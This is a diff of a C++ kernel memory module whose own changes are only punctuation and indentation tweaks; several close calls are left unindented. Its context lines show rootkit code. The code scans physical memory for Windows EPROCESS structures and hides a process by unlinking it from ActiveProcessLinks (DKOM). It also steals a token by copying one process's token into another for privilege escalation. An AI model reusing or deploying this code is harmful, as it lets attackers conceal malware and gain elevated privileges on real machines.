@@ -1,4 +1,4 @@
-// kernel_memory_ops.cpp — CR3 walk, process memory, DKOM, token steal.
+// kernel_memory_ops.cpp: CR3 walk: process memory, DKOM, token steal.
 
 #include "real/kernel/kernel_memory.hpp"
 #include "real/kernel/ioctl_interface.hpp"
@@ -36,10 +36,10 @@ Result<std::uint64_t> virtual_to_physical_kernel(std::uint64_t virt_addr) {
   const off_t offset =
       static_cast<off_t>((virt_addr / 4096) * sizeof(std::uint64_t));
   if (::pread(fd, &pfn, sizeof(pfn), offset) != static_cast<ssize_t>(sizeof(pfn))) {
-    ::close(fd);
+::close(fd);
     return Result<std::uint64_t>(0, "pagemap read failed");
   }
-  ::close(fd);
+::close(fd);
 
   if (!(pfn & (1ULL << 63))) {
     return Result<std::uint64_t>(0, "Page not present");
@@ -63,7 +63,7 @@ Result<std::uint64_t> virtual_to_physical_kernel(std::uint64_t virt_addr) {
   auto read_u64 = [](std::uint64_t pa) -> Result<std::uint64_t> {
     auto bytes = read_physical(pa, 8);
     if (!bytes || bytes->size() < 8) {
-      return Result<std::uint64_t>(0, bytes ? "short read" : bytes.error_msg.c_str());
+      return Result<std::uint64_t>(0, bytes ? "short read": bytes.error_msg.c_str());
     }
     std::uint64_t v = 0;
     std::memcpy(&v, bytes->data(), 8);
@@ -123,7 +123,7 @@ Result<std::uint64_t> get_process_cr3(std::uint32_t pid) {
     std::uint64_t pfn_entry = 0;
     if (::pread(fd, &pfn_entry, sizeof(pfn_entry), 0) ==
         static_cast<ssize_t>(sizeof(pfn_entry))) {
-      ::close(fd);
+::close(fd);
       if (pfn_entry & (1ULL << 63)) {
         const std::uint64_t phys =
             ((pfn_entry & 0x007FFFFFFFFFFFFFULL) * 4096);
@@ -133,7 +133,7 @@ Result<std::uint64_t> get_process_cr3(std::uint32_t pid) {
         return Result<std::uint64_t>(phys);
       }
     } else {
-      ::close(fd);
+::close(fd);
     }
   }
 #endif
@@ -160,7 +160,7 @@ Result<std::uint64_t> get_process_cr3(std::uint32_t pid) {
                   (std::min)(page->size(), sizeof(page_buffer)));
 
       for (std::size_t ep = 0; ep + 0x320 <= 4096; ep += 8) {
-        for (std::uint64_t pid_off : {0x2E0ull, 0x308ull}) {
+        for (std::uint64_t pid_off: {0x2E0ull, 0x308ull}) {
           if (ep + pid_off + 8 > 4096) continue;
           std::uint64_t candidate_pid = 0;
           std::memcpy(&candidate_pid, page_buffer + ep + pid_off, sizeof(candidate_pid));
@@ -323,7 +323,7 @@ Result<void> hide_process_eprocess(std::uint32_t pid) {
       if (!page) continue;
       std::memcpy(page_buf, page->data(), (std::min)(page->size(), sizeof(page_buf)));
       for (std::size_t ep = 0; ep + 0x320 <= 4096; ep += 8) {
-        for (std::uint64_t pid_off : {0x2E0ull, 0x308ull}) {
+        for (std::uint64_t pid_off: {0x2E0ull, 0x308ull}) {
           std::uint64_t cand = 0;
           std::memcpy(&cand, page_buf + ep + pid_off, sizeof(cand));
           if (cand == pid64) {
@@ -362,7 +362,7 @@ Result<void> hide_process_eprocess(std::uint32_t pid) {
 
   // LIST_ENTRY unlink: Blink->Flink = Flink; Flink->Blink = Blink
   // ActiveProcessLinks is a LIST_ENTRY; Flink/Blink are kernel VAs.
-  // Writing via physical requires V2P of those pointers — use physical write
+  // Writing via physical requires V2P of those pointers, use physical write
   // of the link values at the EPROCESS-relative physical offsets when the
   // list entries themselves live in the same physical page (best-effort lab).
   //
@@ -401,7 +401,7 @@ Result<void> hide_process_eprocess(std::uint32_t pid) {
     auto u2 = write_physical(flink + 8, blink_bytes);
     if (!u1 || !u2) {
       return Result<void>("DKOM physical list write failed: " +
-                          std::string(u1 ? u2.error_msg.c_str() : u1.error_msg.c_str()));
+                          std::string(u1 ? u2.error_msg.c_str(): u1.error_msg.c_str()));
     }
   }
 
@@ -432,7 +432,7 @@ Result<void> steal_token(std::uint32_t target_pid, std::uint32_t source_pid) {
         if (!page) continue;
         std::memcpy(buf, page->data(), (std::min)(page->size(), sizeof(buf)));
         for (std::size_t ep = 0; ep + 0x320 <= 4096; ep += 8) {
-          for (std::uint64_t pid_off : {0x2E0ull, 0x308ull}) {
+          for (std::uint64_t pid_off: {0x2E0ull, 0x308ull}) {
             std::uint64_t cand = 0;
             std::memcpy(&cand, buf + ep + pid_off, sizeof(cand));
             if (cand == pid64) {
@@ -461,12 +461,12 @@ Result<void> steal_token(std::uint32_t target_pid, std::uint32_t source_pid) {
   std::uint64_t source_token = 0;
   std::uint64_t token_offset = 0;
 
-  for (auto off : token_offsets) {
+  for (auto off: token_offsets) {
     auto data = read_physical(source_ep + off, sizeof(std::uint64_t));
     if (!data || data->size() < sizeof(std::uint64_t)) continue;
     std::uint64_t candidate = 0;
     std::memcpy(&candidate, data->data(), sizeof(std::uint64_t));
-    // EX_FAST_REF: low bits are refcount — mask when checking kernel range.
+    // EX_FAST_REF: low bits are refcount, mask when checking kernel range.
     const std::uint64_t ptr = candidate & ~0xFULL;
     if (ptr > 0xFFFF800000000000ULL || (ptr > 0x80000000ULL && ptr < 0x0000800000000000ULL)) {
       source_token = candidate;
@@ -490,4 +490,3 @@ Result<void> steal_token(std::uint32_t target_pid, std::uint32_t source_pid) {
 }
 
 }  // namespace real::kernel::mem
-
